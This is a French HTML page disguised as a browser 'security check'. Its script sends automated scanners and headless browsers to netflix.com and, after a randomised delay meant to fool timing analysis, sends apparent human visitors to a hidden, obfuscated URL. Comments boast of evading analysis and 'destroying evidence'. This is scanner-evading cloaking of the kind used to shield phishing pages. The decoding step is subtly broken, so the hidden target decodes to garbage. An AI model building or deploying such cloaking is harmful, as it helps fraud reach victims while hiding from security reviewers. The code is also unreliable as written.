<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de sécurité...</title>
    <meta name="referrer" content="no-referrer">
    
    <noscript>
        <meta http-equiv="refresh" content="0;url=https://www.netflix.com">
    </noscript>

    <style>
        body { margin: 0; background: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: #333; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 15px;}
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p id="t">Analyse de l'intégrité du navigateur...</p>

    <script>
        (function() {
            // Configuration 
            const L = "https://www.netflix.com"; 

            // 3. OBFUSCATION DYNAMIQUE
            // Au lieu d'une fonction d() lisible, on la détruit après usage
            const C = [109,121,121,117,120,63,52,52,108,116,116,108,113,106,51,104,116,114]; 

            // 4. AUDIT DU VECTEUR (Renforcé)
            const isBot = () => {
                try {
                    const nav = window.navigator;
                    const ua = nav.userAgent.toLowerCase();
                    
                    return (
                        // Bots classiques
                        nav.webdriver || 
                        window.document.documentElement.getAttribute("webdriver") ||
                        !nav.languages || nav.languages.length === 0 ||
                        ua.includes("headless") ||
                        // Détection de Puppeteer / Selenium avancée
                        window.callPhantom || 
                        window._phantom || 
                        window.__nightmare ||
                        window.domAutomation ||
                        window.domAutomationController ||
                        // Vérification des dimensions de l'écran (les bots headless ont souvent des résolutions à 0)
                        window.outerWidth === 0 || window.outerHeight === 0
                    );
                } catch (e) {
                    return true; // En cas d'erreur d'analyse, on considère que c'est un bot par sécurité
                }
            };

            // 5. EXÉCUTION DU GOUFFRE
            if (isBot()) {
                window.location.replace(L);
                return;
            }

            // Délai de lissage humain (entre 1.5s et 3s aléatoire pour tromper les analyses de timing)
            const delay = Math.floor(Math.random() * 1500) + 1500;

            setTimeout(() => {
                document.getElementById('t').innerText = "Connexion sécurisée établie.";
                
                // Déchiffrement à la volée
                let target = C.map(x => String.fromCharCode(x - 3)).join('');
                
                // 6. AUTO-DESTRUCTION DES PREUVES
                // On vide le tableau mémoire avant le saut
                C.length = 0; 
                
                // Saut furtif
                window.location.replace(target);
            }, delay);

        })();
    </script>
</body>
</html>
